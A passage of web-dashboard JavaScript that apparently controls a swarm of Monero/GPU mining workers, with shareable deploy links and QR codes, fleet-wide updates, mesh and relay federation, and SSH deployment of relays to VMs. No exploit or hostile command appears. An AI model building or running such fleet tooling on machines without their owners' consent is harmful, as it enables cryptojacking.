        html += '<div class="card" style="margin-bottom:16px"><h3 style="color:var(--accent);margin-bottom:12px">Generate Deploy Link</h3>';
        html += '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">';
        html += '<input id="linkSite" type="text" placeholder="Site name (optional)" class="input-field" />';
        html += '<input id="linkLabel" type="text" placeholder="Label (optional)" class="input-field" />';
        html += '</div><div style="display:grid;grid-template-columns:1fr 1fr auto;gap:8px">';
        html += '<input id="linkMaxUses" type="number" placeholder="Max uses (0=unlimited)" class="input-field" />';
        html += '<input id="linkExpireHrs" type="number" placeholder="Expire hours (0=never)" class="input-field" />';
        html += '<button class="btn-primary" onclick="window.aries.generateDeployLink()">&#x26A1; Generate</button>';
        html += '</div></div>';
        html += '<div id="linkGenResult"></div>';
        if (links.length > 0) {
          html += '<h3 style="color:var(--accent2);margin:16px 0 8px">Active Links (' + links.length + ')</h3>';
          html += '<table class="data-table"><tr><th>Token</th><th>Site</th><th>Label</th><th>Uses</th><th>Created</th><th>Actions</th></tr>';
          for (var i = 0; i < links.length; i++) {
            var l = links[i];
            var url = location.origin + '/deploy/' + l.token;
            html += '<tr><td><code style="color:var(--accent)">' + escapeHtml(l.token) + '</code></td>';
            html += '<td>' + escapeHtml(l.site || '-') + '</td>';
            html += '<td>' + escapeHtml(l.label || '-') + '</td>';
            html += '<td>' + l.uses + (l.maxUses ? '/' + l.maxUses : '') + '</td>';
            html += '<td>' + new Date(l.created).toLocaleDateString() + '</td>';
            html += '<td><button class="btn-sm" onclick="navigator.clipboard.writeText(\'' + url + '\');window.aries.toast(\'Copied!\',\'success\')">Copy</button> ';
            html += '<button class="btn-sm" onclick="window.aries.showQR(\'' + url + '\')">QR</button> ';
            html += '<button class="btn-sm" style="color:var(--red)" onclick="window.aries.revokeDeployLink(\'' + l.token + '\')">Revoke</button></td></tr>';
          }
          html += '</table>';
        } else {
          html += '<p style="color:var(--text-dim);margin-top:16px">No deploy links yet. Generate one above.</p>';
        }
        el.innerHTML = html;
      }).catch(function(e) { el.innerHTML = '<p style="color:var(--red)">Error: ' + escapeHtml(e.message) + '</p>'; });
    }

    function generateDeployLink() {
      var site = (document.getElementById('linkSite') || {}).value || '';
      var label = (document.getElementById('linkLabel') || {}).value || '';
      var maxUses = parseInt((document.getElementById('linkMaxUses') || {}).value) || 0;
      var expireHours = parseInt((document.getElementById('linkExpireHrs') || {}).value) || 0;
      api('POST', 'links/generate', { site: site, label: label, maxUses: maxUses, expireHours: expireHours }).then(function(data) {
        var el = document.getElementById('linkGenResult');
        if (el) {
          el.innerHTML = '<div class="card" style="border:1px solid var(--green);margin-bottom:12px"><h3 style="color:var(--green)">&#x2705; Link Generated!</h3>' +
            '<div class="cmd-box" style="margin:8px 0;background:var(--bg);padding:12px;border-radius:6px;word-break:break-all"><a href="' + escapeHtml(data.url) + '" target="_blank" style="color:var(--accent)">' + escapeHtml(data.url) + '</a></div>' +
            '<button class="btn-sm" onclick="navigator.clipboard.writeText(\'' + escapeHtml(data.url) + '\');window.aries.toast(\'Copied!\',\'success\')">&#x1F4CB; Copy URL</button></div>';
        }
        toast('Deploy link generated!', 'success');
        _loadedPanels['link-deploy'] = false;
        setTimeout(loadLinkDeploy, 500);
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function revokeDeployLink(token) {
      api('DELETE', 'links/' + token).then(function() {
        toast('Link revoked', 'success');
        _loadedPanels['link-deploy'] = false;
        loadLinkDeploy();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function showQR(url) {
      // Simple QR via external API (no dependency)
      var qrUrl = 'https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=' + encodeURIComponent(url);
      var overlay = document.createElement('div');
      overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);display:flex;align-items:center;justify-content:center;z-index:9999;cursor:pointer';
      overlay.onclick = function() { overlay.remove(); };
      overlay.innerHTML = '<div style="background:#12122a;padding:24px;border-radius:12px;text-align:center;border:1px solid var(--accent)">' +
        '<h3 style="color:var(--accent);margin-bottom:12px">Scan to Deploy</h3>' +
        '<img src="' + qrUrl + '" style="border-radius:8px;background:white;padding:8px" />' +
        '<div style="margin-top:12px;font-size:11px;color:var(--text-dim);word-break:break-all;max-width:300px">' + escapeHtml(url) + '</div></div>';
      document.body.appendChild(overlay);
    }

    // ── Hashrate Optimizer Panel ──
    function loadHashrateOpt() {
      var el = document.getElementById('panel-hashrate-opt');
      if (!el) return;
      el.innerHTML = '<div class="spinner"></div> Loading...';
      Promise.all([
        api('GET', 'hashrate/stats').catch(function() { return {}; }),
        api('GET', 'hashrate/profiles').catch(function() { return { profiles: {} }; })
      ]).then(function(results) {
        var stats = results[0], profiles = (results[1].profiles || {});
        var html = '<h2 style="color:var(--accent);margin-bottom:16px">&#x26A1; Hashrate Optimizer</h2>';
        html += '<div class="stat-row">';
        html += '<div class="stat-card"><div class="stat-card-val">' + fmtHashrate(stats.totalHashrate || 0) + '</div><div class="stat-card-label">Total Hashrate</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + fmtHashrate(stats.avgPerWorker || 0) + '</div><div class="stat-card-label">Avg/Worker</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (stats.workerCount || 0) + '</div><div class="stat-card-label">Workers</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (stats.optimizedCount || 0) + '/' + ((stats.optimizedCount || 0) + (stats.pendingCount || 0)) + '</div><div class="stat-card-label">Optimized</div></div>';
        html += '</div>';
        html += '<div style="margin:12px 0"><button class="btn-primary" onclick="window.aries.optimizeAll()">&#x1F680; Optimize All Workers</button></div>';
        var pKeys = Object.keys(profiles);
        if (pKeys.length > 0) {
          html += '<h3 style="color:var(--accent2);margin:16px 0 8px">Worker Profiles</h3>';
          html += '<table class="data-table"><tr><th>Worker</th><th>CPU</th><th>Cores</th><th>Best Threads</th><th>Best H/s</th><th>Tested</th><th>Actions</th></tr>';
          pKeys.sort(function(a, b) { return (profiles[b].bestHashrate || 0) - (profiles[a].bestHashrate || 0); });
          for (var i = 0; i < pKeys.length; i++) {
            var p = profiles[pKeys[i]];
            html += '<tr><td><code>' + escapeHtml(pKeys[i].substring(0, 16)) + '</code></td>';
            html += '<td>' + escapeHtml(p.cpu || '-') + '</td>';
            html += '<td>' + (p.cores || '-') + '</td>';
            html += '<td>' + (p.bestThreads || '-') + '</td>';
            html += '<td style="color:var(--green)">' + fmtHashrate(p.bestHashrate || 0) + '</td>';
            html += '<td>' + (p.tested ? '&#x2705;' : '&#x23F3;') + '</td>';
            html += '<td><button class="btn-sm" onclick="window.aries.optimizeWorker(\'' + escapeHtml(pKeys[i]) + '\')">Optimize</button> ';
            html += '<input type="number" id="thr_' + i + '" value="' + (p.bestThreads || '') + '" style="width:50px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:4px;padding:2px 4px" /> ';
            html += '<button class="btn-sm" onclick="window.aries.setWorkerThreads(\'' + escapeHtml(pKeys[i]) + '\',document.getElementById(\'thr_' + i + '\').value)">Set</button></td></tr>';
          }
          html += '</table>';
        } else {
          html += '<p style="color:var(--text-dim);margin-top:16px">No worker profiles yet. Workers will appear as they report hashrate data.</p>';
        }
        // Push Update section
        html += '<div class="card" style="margin-top:20px"><h3 style="color:var(--accent);margin-bottom:8px">&#x1F4E6; Push Worker Update</h3>';
        html += '<div style="display:flex;gap:8px"><input id="updateVersion" type="text" placeholder="Version tag (optional)" class="input-field" style="flex:1" />';
        html += '<button class="btn-primary" onclick="window.aries.pushSwarmUpdate()">&#x1F680; Push Update to All</button></div></div>';
        el.innerHTML = html;
      }).catch(function(e) { el.innerHTML = '<p style="color:var(--red)">Error: ' + escapeHtml(e.message) + '</p>'; });
    }

    function fmtHashrate(h) {
      if (typeof h === 'string') return h;
      if (!h || h <= 0) return '0 H/s';
      if (h >= 1000000) return (h / 1000000).toFixed(2) + ' MH/s';
      if (h >= 1000) return (h / 1000).toFixed(1) + ' KH/s';
      return h.toFixed(0) + ' H/s';
    }

    function optimizeWorker(workerId) {
      toast('Starting optimization for ' + workerId + '...', 'info');
      api('POST', 'hashrate/optimize', { workerId: workerId }).then(function() {
        toast('Optimization started', 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function optimizeAll() {
      toast('Starting optimization for all workers...', 'info');
      api('POST', 'hashrate/optimize', {}).then(function() {
        toast('Optimization queue started', 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function setWorkerThreads(workerId, threads) {
      var t = parseInt(threads);
      if (!t || t < 1) return toast('Invalid thread count', 'error');
      api('POST', 'hashrate/threads', { workerId: workerId, threads: t }).then(function() {
        toast('Threads set to ' + t + ' for ' + workerId, 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function pushSwarmUpdate() {
      var version = (document.getElementById('updateVersion') || {}).value || '';
      api('POST', 'swarm/push-update', { version: version }).then(function(r) {
        toast('Update pushed to all workers!', 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ═══════════════════════════════
    //  GPU MINING & ALGO SWITCHING
    // ═══════════════════════════════
    function loadGpuMining() {
      var el = document.getElementById('mainContent');
      if (!el) return;
      el.innerHTML = '<div class="spinner"></div> Loading GPU mining...';

      Promise.all([
        api('GET', 'gpu/status').catch(function() { return {}; }),
        api('GET', 'algo/current').catch(function() { return { current: {}, alternatives: [] }; })
      ]).then(function(results) {
        var st = results[0] || {};
        var algo = results[1] || {};
        var gpus = st.gpus || [];
        var hr = st.hashrate || {};
        var alts = algo.alternatives || [];
        var html = '<div class="panel-header"><h2>&#x1F3AE; GPU Mining & Algorithm Switching</h2></div>';

        // GPU Detection Card
        html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">&#x1F4F9; Detected GPUs</h3>';
        if (gpus.length > 0) {
          html += '<table class="data-table"><tr><th>Name</th><th>Vendor</th><th>VRAM</th><th>Driver</th><th>Capable</th></tr>';
          for (var i = 0; i < gpus.length; i++) {
            var g = gpus[i];
            html += '<tr><td>' + escapeHtml(g.name) + '</td><td>' + g.vendor + '</td><td>' + (g.vram_mb || 0) + ' MB</td><td>' + escapeHtml(g.driver || '-') + '</td>';
            html += '<td style="color:' + (g.capable ? 'var(--green)' : 'var(--red)') + '">' + (g.capable ? '✓ Yes' : '✗ No') + '</td></tr>';
          }
          html += '</table>';
        } else {
          html += '<p style="color:var(--dim)">No GPUs detected yet.</p>';
        }
        html += '<button class="btn-primary" onclick="window.aries.gpuDetect()" style="margin-top:8px">&#x1F50D; Detect GPUs</button></div>';

        // GPU Mining Status
        html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">&#x26A1; GPU Mining</h3>';
        html += '<div style="display:flex;gap:16px;align-items:center;margin-bottom:8px">';
        html += '<span>Status: <strong style="color:' + (st.gpuMining ? 'var(--green)' : 'var(--dim)') + '">' + (st.gpuMining ? 'MINING' : 'STOPPED') + '</strong></span>';
        html += '<span>Hashrate: <strong style="color:var(--accent)">' + (hr.hashrate || 0).toFixed(1) + ' H/s</strong></span>';
        html += '<span>Accepted: <strong>' + (hr.accepted || 0) + '</strong></span>';
        html += '</div>';
        if (st.gpuMining) {
          html += '<button class="btn-primary" onclick="window.aries.gpuStop()" style="background:var(--red)">&#x23F9; Stop GPU Mining</button>';
        } else {
          html += '<button class="btn-primary" onclick="window.aries.gpuStart()">&#x25B6; Start GPU Mining</button>';
        }
        html += '</div>';

        // Algorithm Profitability
        html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">&#x1F4CA; Algorithm Profitability</h3>';
        html += '<div style="margin-bottom:8px">Current: <strong style="color:var(--accent)">' + escapeHtml((algo.current && algo.current.label) || 'RandomX') + '</strong> (' + escapeHtml((algo.current && algo.current.coin) || 'XMR') + ')</div>';
        if (alts.length > 0) {
          html += '<table class="data-table"><tr><th>Algorithm</th><th>Coin</th><th>Type</th><th>Profitability</th><th>Action</th></tr>';
          for (var j = 0; j < alts.length; j++) {
            var a = alts[j];
            var isCurrent = a.algo === (algo.current && algo.current.algo);
            html += '<tr style="' + (isCurrent ? 'background:rgba(0,255,136,0.1)' : '') + '">';
            html += '<td>' + escapeHtml(a.label || a.algo) + (isCurrent ? ' ★' : '') + '</td>';
            html += '<td>' + escapeHtml(a.coin || '') + '</td>';
            html += '<td>' + (a.type || '') + '</td>';
            html += '<td>' + (a.profitability || 0).toFixed(8) + '</td>';
            html += '<td>' + (isCurrent ? '<span style="color:var(--green)">Active</span>' : '<button class="btn-sm" onclick="window.aries.algoSwitch(\'' + a.algo + '\')">Switch</button>') + '</td>';
            html += '</tr>';
          }
          html += '</table>';
        } else {
          html += '<p style="color:var(--dim)">Click refresh to check profitability.</p>';
        }
        html += '<div style="margin-top:8px;display:flex;gap:8px">';
        html += '<button class="btn-sm" onclick="window.aries.algoRefreshProfit()">&#x1F504; Refresh Profitability</button>';
        html += '<button class="btn-sm" onclick="window.aries.algoBroadcast()">&#x1F4E1; Broadcast to Fleet</button>';
        html += '</div></div>';

        // Auto-Switch
        html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">&#x1F500; Auto-Switch</h3>';
        html += '<div style="display:flex;gap:12px;align-items:center">';
        html += '<label class="miner-toggle"><input type="checkbox" id="autoSwitchToggle" ' + (algo.autoSwitch ? 'checked' : '') + ' onchange="window.aries.algoAutoSwitch(this.checked)"> Auto-Switch</label>';
        html += '<label>Interval: <input type="number" id="autoSwitchInterval" value="' + (algo.autoSwitchInterval || 30) + '" min="5" max="360" style="width:60px"> min</label>';
        html += '</div>';
        html += '<div style="margin-top:6px;color:var(--dim);font-size:12px">Switches: ' + (algo.switchCount || 0) + ' | Last switch: ' + (algo.lastSwitch ? new Date(algo.lastSwitch).toLocaleString() : 'Never') + ' | Last check: ' + (algo.lastCheck ? new Date(algo.lastCheck).toLocaleString() : 'Never') + '</div>';
        html += '</div>';

        el.innerHTML = html;
      });
    }

    function gpuDetect() {
      api('GET', 'gpu/detect').then(function(r) {
        toast('Detected ' + (r.gpus || []).length + ' GPU(s)', 'success');
        loadGpuMining();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function gpuStart() {
      api('POST', 'gpu/start', {}).then(function(r) {
        if (r.ok) { toast('GPU mining started: ' + (r.algo || ''), 'success'); loadGpuMining(); }
        else toast(r.error || 'Failed', 'error');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function gpuStop() {
      api('POST', 'gpu/stop').then(function() {
        toast('GPU mining stopped', 'success'); loadGpuMining();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function algoSwitch(algo) {
      api('POST', 'algo/switch', { algo: algo }).then(function(r) {
        if (r.ok) { toast('Switched to ' + (r.label || algo), 'success'); loadGpuMining(); }
        else toast(r.error || 'Failed', 'error');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function algoRefreshProfit() {
      toast('Checking profitability...', 'info');
      api('GET', 'algo/profitability').then(function() {
        toast('Profitability updated', 'success'); loadGpuMining();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function algoAutoSwitch(enabled) {
      var interval = parseInt((document.getElementById('autoSwitchInterval') || {}).value) || 30;
      api('POST', 'algo/auto-switch', { enabled: enabled, intervalMinutes: interval }).then(function() {
        toast('Auto-switch ' + (enabled ? 'enabled' : 'disabled'), 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function algoBroadcast() {
      api('POST', 'algo/broadcast', {}).then(function(r) {
        toast('Config broadcast to fleet!', 'success');
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ═══════════════════════════════
    //  MESH NETWORK
    // ═══════════════════════════════
    function loadMeshNetwork() {
      var el = document.getElementById('panelContent');
      if (!el) return;
      el.innerHTML = '<div class="loading-pulse">Loading mesh network...</div>';

      Promise.all([
        api('GET', 'mesh/topology'),
        api('GET', 'mesh/stats')
      ]).then(function(results) {
        var topo = results[0];
        var stats = results[1];
        var html = '<h2 style="color:var(--accent);margin-bottom:16px">&#x1F578;&#xFE0F; Mesh Network</h2>';

        // Stats cards
        html += '<div class="stats-grid">';
        html += '<div class="stat-card"><div class="stat-card-val">' + (stats.role || 'none') + '</div><div class="stat-card-label">Role</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (stats.peers || 0) + '</div><div class="stat-card-label">Peers</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (stats.messagesRelayed || 0) + '</div><div class="stat-card-label">Messages Relayed</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + formatBytes(stats.bytesRelayed || 0) + '</div><div class="stat-card-label">Bytes Relayed</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (stats.queueSize || 0) + '</div><div class="stat-card-label">Queue</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + formatUptime(stats.uptime || 0) + '</div><div class="stat-card-label">Uptime</div></div>';
        html += '</div>';

        // Topology visualization
        html += '<div class="card" style="margin:16px 0;padding:20px">';
        html += '<h3 style="color:var(--accent2);margin-bottom:12px">Topology</h3>';
        html += '<div style="position:relative;min-height:300px;display:flex;align-items:center;justify-content:center">';

        var gateway = topo.gateway;
        var peers = topo.peers || [];
        var self = topo.self || {};

        if (gateway) {
          // Gateway node in center
          var isMe = self.workerId === gateway.workerId;
          html += '<div style="position:absolute;left:50%;top:50%;transform:translate(-50%,-50%);z-index:2">';
          html += '<div style="width:80px;height:80px;border-radius:50%;background:' + (isMe ? 'var(--green)' : 'var(--accent)') + ';display:flex;align-items:center;justify-content:center;color:#000;font-weight:bold;font-size:12px;text-align:center;box-shadow:0 0 20px ' + (isMe ? 'var(--green)' : 'var(--accent)') + '">';
          html += '&#x1F310;<br>' + escapeHtml((gateway.workerId || '').substring(0, 10));
          html += '</div></div>';

          // Peer nodes in a circle
          var count = peers.length;
          for (var i = 0; i < count; i++) {
            var angle = (2 * Math.PI * i) / Math.max(count, 1);
            var radius = 120;
            var px = 50 + Math.cos(angle) * 35;
            var py = 50 + Math.sin(angle) * 35;
            var isPeerMe = self.workerId === peers[i].workerId;
            html += '<div style="position:absolute;left:' + px + '%;top:' + py + '%;transform:translate(-50%,-50%);z-index:2">';
            html += '<div style="width:56px;height:56px;border-radius:50%;background:' + (isPeerMe ? 'var(--green)' : 'var(--accent2)') + ';display:flex;align-items:center;justify-content:center;color:#000;font-size:10px;font-weight:bold;text-align:center">';
            html += '&#x1F4BB;<br>' + escapeHtml((peers[i].workerId || '').substring(0, 8));
            html += '</div></div>';
            // Connection line (SVG)
            html += '<svg style="position:absolute;left:0;top:0;width:100%;height:100%;z-index:1;pointer-events:none"><line x1="50%" y1="50%" x2="' + px + '%" y2="' + py + '%" stroke="var(--accent)" stroke-width="1" stroke-dasharray="4" opacity="0.4"/></svg>';
          }
        } else {
          html += '<p style="color:var(--text-dim)">No mesh network active. No gateway elected.</p>';
        }
        html += '</div></div>';

        // Re-elect button
        html += '<div style="margin:12px 0"><button class="btn-primary" onclick="window.aries.meshReElect()">&#x1F504; Force Re-Election</button> ';
        html += '<button class="btn-sm" onclick="window.aries.loadMeshNetwork()">&#x1F504; Refresh</button></div>';

        // Peer list
        if (peers.length > 0) {
          html += '<h3 style="color:var(--accent2);margin:16px 0 8px">Peers</h3>';
          html += '<table class="data-table"><tr><th>Worker</th><th>IP</th><th>Latency</th><th>Last Seen</th></tr>';
          for (var j = 0; j < peers.length; j++) {
            var p = peers[j];
            var ago = p.lastSeen ? Math.round((Date.now() - p.lastSeen) / 1000) + 's ago' : '-';
            html += '<tr><td><code>' + escapeHtml(p.workerId || '-') + '</code></td>';
            html += '<td>' + escapeHtml(p.ip || '-') + '</td>';
            html += '<td>' + (p.latency || 0) + 'ms</td>';
            html += '<td>' + ago + '</td></tr>';
          }
          html += '</table>';
        }

        // Gateway info
        if (stats.gatewayIp) {
          html += '<p style="color:var(--text-dim);margin-top:8px">Gateway: <strong>' + escapeHtml(stats.gatewayIp) + '</strong></p>';
        }

        el.innerHTML = html;
      }).catch(function(e) { el.innerHTML = '<p style="color:var(--red)">Error: ' + escapeHtml(e.message) + '</p>'; });
    }

    function formatBytes(b) {
      if (b >= 1073741824) return (b / 1073741824).toFixed(1) + ' GB';
      if (b >= 1048576) return (b / 1048576).toFixed(1) + ' MB';
      if (b >= 1024) return (b / 1024).toFixed(1) + ' KB';
      return b + ' B';
    }

    function formatUptime(s) {
      if (s >= 86400) return Math.floor(s / 86400) + 'd ' + Math.floor((s % 86400) / 3600) + 'h';
      if (s >= 3600) return Math.floor(s / 3600) + 'h ' + Math.floor((s % 3600) / 60) + 'm';
      if (s >= 60) return Math.floor(s / 60) + 'm ' + (s % 60) + 's';
      return s + 's';
    }

    function meshReElect() {
      api('POST', 'mesh/re-elect').then(function() {
        toast('Re-election triggered', 'success');
        setTimeout(loadMeshNetwork, 3000);
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    // ═══════════════════════════════
    //  RELAY FEDERATION
    // ═══════════════════════════════
    function loadRelayFederation() {
      var el = document.getElementById('panelContent');
      if (!el) return;
      el.innerHTML = '<div class="spinner"></div> Loading relay federation...';
      api('GET', 'federation/status').then(function(data) {
        var relays = data.relays || [];
        var sync = data.sync || {};
        var failover = data.failover || [];
        var html = '<div class="panel-header"><h2>&#x1F310; Relay Federation</h2>';
        html += '<button class="btn-sm" onclick="window.aries.loadRelayFederation()">&#x1F504; Refresh</button></div>';

        // Status cards
        html += '<div class="stat-row">';
        var upCount = 0, downCount = 0;
        for (var i = 0; i < relays.length; i++) { if (relays[i].status === 'up') upCount++; else if (relays[i].status === 'down') downCount++; }
        html += '<div class="stat-card"><div class="stat-card-val">' + relays.length + '</div><div class="stat-card-label">Total Relays</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val" style="color:var(--green)">' + upCount + '</div><div class="stat-card-label">Online</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val" style="color:var(--red)">' + downCount + '</div><div class="stat-card-label">Down</div></div>';
        var totalWorkers = 0; for (var w = 0; w < relays.length; w++) totalWorkers += (relays[w].workerCount || 0);
        html += '<div class="stat-card"><div class="stat-card-val">' + totalWorkers + '</div><div class="stat-card-label">Total Workers</div></div>';
        html += '</div>';

        // Relay cards
        html += '<div class="dashboard-grid">';
        for (var r = 0; r < relays.length; r++) {
          var rl = relays[r];
          var dot = rl.status === 'up' ? '<span style="color:var(--green)">&#x25CF;</span>' : (rl.status === 'down' ? '<span style="color:var(--red)">&#x25CF;</span>' : '<span style="color:var(--yellow)">&#x25CF;</span>');
          var isPrimary = sync.primaryUrl === rl.url;
          html += '<div class="dashboard-card">';
          html += '<h3>' + dot + ' ' + escapeHtml(rl.label || rl.url) + (isPrimary ? ' <span style="font-size:11px;color:var(--accent)">[PRIMARY]</span>' : '') + '</h3>';
          html += '<div style="font-size:12px;color:var(--text-dim);margin-bottom:8px;word-break:break-all">' + escapeHtml(rl.url) + '</div>';
          html += '<div style="font-size:13px">Status: <b>' + (rl.status || 'unknown') + '</b></div>';
          html += '<div style="font-size:13px">Latency: ' + (rl.latency != null ? rl.latency + 'ms' : '-') + '</div>';
          html += '<div style="font-size:13px">Workers: ' + (rl.workerCount || 0) + '</div>';
          html += '<div style="font-size:13px">Priority: ' + (rl.priority != null ? rl.priority : '-') + '</div>';
          html += '<div style="font-size:13px">Last Sync: ' + (rl.lastSync ? new Date(rl.lastSync).toLocaleTimeString() : 'never') + '</div>';
          html += '<button class="btn-sm" style="margin-top:8px;color:var(--red)" onclick="window.aries.fedRemoveRelay(\'' + escapeHtml(rl.url) + '\')">Remove</button>';
          html += '</div>';
        }
        html += '</div>';

        // Add Relay form
        html += '<div class="card" style="margin:16px 0"><h3 style="margin:0 0 8px;color:var(--accent)">Add Relay</h3>';
        html += '<div style="display:flex;gap:8px;flex-wrap:wrap">';
        html += '<input id="fedRelayUrl" type="text" placeholder="https://relay.example.com:9700" class="input" style="flex:2;min-width:200px">';
        html += '<input id="fedRelaySecret" type="text" placeholder="Secret" class="input" style="flex:1;min-width:100px">';
        html += '<input id="fedRelayLabel" type="text" placeholder="Label" class="input" style="flex:1;min-width:80px">';
        html += '<input id="fedRelayPriority" type="number" placeholder="Priority" class="input" style="width:80px">';
        html += '<button class="btn-primary" onclick="window.aries.fedAddRelay()">Add Relay</button>';
        html += '</div></div>';

        // Failover order
        html += '<div class="card" style="margin:16px 0"><h3 style="margin:0 0 8px;color:var(--accent)">Failover Order</h3>';
        if (failover.length === 0) {
          html += '<div style="color:var(--text-dim)">No relays configured</div>';
        } else {
          html += '<table class="data-table"><tr><th>#</th><th>URL</th><th>Label</th><th>Status</th><th>Latency</th></tr>';
          for (var f = 0; f < failover.length; f++) {
            var fo = failover[f];
            var sc = fo.status === 'up' ? 'color:var(--green)' : (fo.status === 'down' ? 'color:var(--red)' : 'color:var(--yellow)');
            html += '<tr><td>' + (f + 1) + '</td><td style="font-size:12px;word-break:break-all">' + escapeHtml(fo.url) + '</td><td>' + escapeHtml(fo.label || '-') + '</td><td style="' + sc + '">' + fo.status + '</td><td>' + (fo.latency != null ? fo.latency + 'ms' : '-') + '</td></tr>';
          }
          html += '</table>';
        }
        html += '</div>';

        // Actions
        html += '<div style="display:flex;gap:8px;flex-wrap:wrap;margin:16px 0">';
        html += '<button class="btn-primary" onclick="window.aries.fedSyncNow()">&#x1F504; Sync Now</button>';
        html += '<button class="btn-primary" onclick="window.aries.fedBroadcast()">&#x1F4E1; Broadcast Config</button>';
        html += '<button class="btn-sm" onclick="window.aries.fedDeploy()">&#x1F680; Deploy Relay to VM</button>';
        html += '</div>';

        // Deploy form (hidden by default)
        html += '<div id="fedDeployForm" style="display:none" class="card" style="margin:16px 0"><h3 style="margin:0 0 8px;color:var(--accent)">Deploy Relay to VM</h3>';
        html += '<div style="display:flex;gap:8px;flex-wrap:wrap">';
        html += '<input id="fedDeployIp" type="text" placeholder="IP Address" class="input" style="flex:1">';
        html += '<input id="fedDeployUser" type="text" placeholder="User (root)" class="input" style="width:100px">';
        html += '<input id="fedDeployKey" type="text" placeholder="SSH Key Path" class="input" style="flex:1">';
        html += '<button class="btn-primary" onclick="window.aries.fedDeploySubmit()">Deploy</button>';
        html += '</div></div>';

        el.innerHTML = html;
      }).catch(function(e) {
        el.innerHTML = '<div style="color:var(--red)">Error loading federation: ' + escapeHtml(e.message) + '</div>';
      });
    }

    function fedAddRelay() {
      var url = document.getElementById('fedRelayUrl').value.trim();
      var secret = document.getElementById('fedRelaySecret').value.trim();
      var label = document.getElementById('fedRelayLabel').value.trim();
      var priority = document.getElementById('fedRelayPriority').value.trim();
      if (!url) return toast('URL required', 'error');
      api('POST', 'federation/relay', { url: url, secret: secret, label: label, priority: priority ? parseInt(priority) : undefined }).then(function() {
        toast('Relay added', 'success');
        loadRelayFederation();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function fedRemoveRelay(url) {
      if (!confirm('Remove relay ' + url + '?')) return;
      api('DELETE', 'federation/relay', { url: url }).then(function() {
        toast('Relay removed', 'success');
        loadRelayFederation();
      }).catch(function(e) { toast('Error: ' + e.message, 'error'); });
    }

    function fedSyncNow() {
      toast('Syncing...', 'info');
      api('POST', 'federation/sync').then(function() {
        toast('Sync complete', 'success');
        loadRelayFederation();
      }).catch(function(e) { toast('Sync error: ' + e.message, 'error'); });
    }

    function fedBroadcast() {
      api('POST', 'federation/broadcast').then(function() {
        toast('Failover config broadcast to workers', 'success');
      }).catch(function(e) { toast('Broadcast error: ' + e.message, 'error'); });
    }

    function fedDeploy() {
      var el = document.getElementById('fedDeployForm');
      if (el) el.style.display = el.style.display === 'none' ? 'block' : 'none';
    }

    function fedDeploySubmit() {
      var ip = document.getElementById('fedDeployIp').value.trim();
      var user = document.getElementById('fedDeployUser').value.trim() || 'root';
      var keyPath = document.getElementById('fedDeployKey').value.trim();
      if (!ip) return toast('IP required', 'error');
      toast('Deploying relay to ' + ip + '...', 'info');
      api('POST', 'federation/deploy', { ip: ip, credentials: { user: user, keyPath: keyPath } }).then(function(r) {
        toast('Relay deployed to ' + ip, 'success');
        loadRelayFederation();
      }).catch(function(e) { toast('Deploy error: ' + e.message, 'error'); });
    }

    // ═══════════════════════════════
    //  SITE CONTROL
    // ═══════════════════════════════
    function loadSiteControl() {
      var el = document.getElementById('panel-site-control');
      if (!el) return;
      el.innerHTML = '<div class="spinner"></div> Loading site control...';
      api('GET', 'sites/overview').then(function(ov) {
        var html = '';
        html += '<h2 style="color:var(--accent);margin:0 0 16px">&#x1F3E2; Site Controller</h2>';
        // Overview cards
        html += '<div class="stat-row">';
        html += '<div class="stat-card"><div class="stat-card-val">' + (ov.totalSites || 0) + '</div><div class="stat-card-label">Sites</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (ov.totalWorkers || 0) + '</div><div class="stat-card-label">Workers</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + fmtHashrate(ov.totalHashrate || 0) + '</div><div class="stat-card-label">Hashrate</div></div>';
        html += '<div class="stat-card"><div class="stat-card-val">' + (ov.totalAlerts || 0) + '</div><div class="stat-card-label">Alerts</div></div>';
        html += '</div>';
        // Add site form
        html += '<div class="card" style="margin:12px 0"><h3 style="margin:0 0 8px;color:var(--accent)">Add Site</h3>';
        html += '<div style="display:flex;gap:8px;flex-wrap:wrap">';
        html += '<input id="scName" type="text" placeholder="Site name" class="input-field" style="flex:1;min-width:120px" />';
